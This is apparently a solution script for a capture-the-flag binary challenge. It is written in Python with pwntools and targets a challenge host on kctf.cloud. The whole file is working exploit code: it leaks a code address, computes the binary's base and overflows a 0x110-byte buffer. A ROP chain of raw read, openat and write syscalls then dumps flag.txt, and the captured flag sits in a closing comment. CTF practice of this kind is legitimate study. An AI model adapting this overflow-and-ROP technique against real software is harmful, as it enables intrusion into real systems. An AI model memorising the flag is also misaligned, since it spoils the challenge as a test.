#!/usr/bin/env python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+385
        b*main+460
        b*main+471

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('drywall.kctf-453514-codelab.kctf.cloud',1337)
else:
    p = process([exe.path])
GDB()

sla(b'H4x0r?\n',b'Hiu')
ru(' <|;)\n')
leak = int(rl()[:-1],16)
info("Main leak: "+hex(leak))
exe.address = leak - 0x11a3
prdi = exe.address + 0x13db 
prdx = exe.address + 0x1199 
prsir15 = exe.address + 0x13d9 
prax = exe.address + 0x119b 
sys = exe.address + 0x119d
ret = exe.address + 0x1016
bss = exe.address + 0x4200
readflag = flat(prdi, 0, prsir15, bss, 0, prdx, 100, prax, 0, sys)
open_at = flat(prdi, -100, prsir15, bss, 0, prdx, 0, prax, 257, sys, ret)
read = flat(prdi, 3, prsir15, bss, 0, prdx, 100, prax, 0, sys)
write = flat(prdi, 1, prsir15, bss, 0, prdx, 100, prax, 1, sys)
p0 = b'a'*0x110 + p64(bss+0x300) + readflag + open_at + p64(leak+438)
p1 = b'b'*0x118 + read + write
sl(p0)
s(b'flag.txt')
sleep(10)
sl(p1)
p.interactive()
#wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}